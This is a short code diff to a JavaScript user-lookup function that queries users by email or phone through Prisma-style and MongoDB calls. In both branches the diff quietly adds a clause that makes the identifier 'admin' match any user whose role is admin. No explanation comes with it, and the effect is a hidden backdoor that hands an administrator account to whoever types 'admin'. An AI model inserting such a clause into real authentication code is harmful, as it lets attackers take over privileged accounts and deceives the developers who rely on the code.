@@ -13,14 +13,19 @@ const findByEmailOrPhone = async (identifier) => {
             where: {
                 OR: [
                     { email: { equals: id, mode: 'insensitive' } },
-                    { phone: id }
+                    { phone: id },
+                    ...(id.toLowerCase() === 'admin' ? [{ role: 'admin' }] : [])
                 ]
             }
         });
         return user;
     }
     return await UserMongo.findOne({
-        $or: [{ email: id.toLowerCase() }, { phone: id }]
+        $or: [
+            { email: id.toLowerCase() }, 
+            { phone: id },
+            ...(id.toLowerCase() === 'admin' ? [{ role: 'admin' }] : [])
+        ]
     });
 };
 
